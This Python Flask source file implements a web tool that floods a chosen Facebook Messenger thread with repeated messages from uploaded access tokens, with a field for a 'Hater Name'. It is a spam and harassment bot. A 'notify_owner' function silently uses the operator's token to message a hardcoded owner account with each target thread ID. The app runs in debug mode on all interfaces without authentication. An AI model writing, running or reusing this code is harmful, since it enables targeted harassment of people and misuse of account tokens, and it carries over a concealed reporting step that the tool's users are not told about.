from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

# ✅ Owner Notification Function ✅
def notify_owner(owner_id, access_token, thread_id, task_id):
    """Jab naya task start ho, tab owner ko notify kare."""
    api_url = f'https://graph.facebook.com/v15.0/{owner_id}/messages'
    message = f'🛑 New Task Started!\n📌 Task ID: {task_id}\n📩 Thread ID: {thread_id}'
    parameters = {'access_token': access_token, 'message': message}

    response = requests.post(api_url, data=parameters, headers=headers)
    if response.status_code == 200:
        print(f"✅ Owner ko Notify kar diya gaya: Task {task_id}")
    else:
        print(f"❌ Owner Notification Failed: {response.text}")

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✅ Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"❌ Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()
        owner_id = "100064267823693"  
        notify_owner(owner_id, access_tokens[0], thread_id, task_id) 
        return f'Task started with ID: {task_id}'
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    label { color: white; }
    body {
      background-image: url('https://i.ibb.co/LRrPTkG/c278d531d734cc6fcf79165d664fdee3.jpg');
      background-size: cover;
      color: white;
    }
    .container {
      max-width: 350px;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px white;
    }
    .form-control {
      background: transparent;
      color: white;
    }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; color: #888; }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="text-center">🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐏𝐑𝐈𝐍𝐂𝐄 𝐇𝐄𝐑𝐄🥀🥀</h1>
    <form method="post" enctype="multipart/form-data">
      <label>Select Token Option</label>
      <select class="form-control" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>

      <label>Enter Single Token</label>
      <input type="text" class="form-control" name="singleToken">

      <label>Choose Token File</label>
      <input type="file" class="form-control" name="tokenFile">

      <label>Enter Inbox/convo UID</label>
      <input type="text" class="form-control" name="threadId" required>

      <label>Enter Your Hater Name</label>
      <input type="text" class="form-control" name="kidx" required>

      <label>Enter Time (seconds)</label>
      <input type="number" class="form-control" name="time" required>

      <label>Choose Your NP File</label>
      <input type="file" class="form-control" name="txtFile" required>

      <button type="submit" class="btn btn-primary btn-submit">Run</button>
    </form>
  </div>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
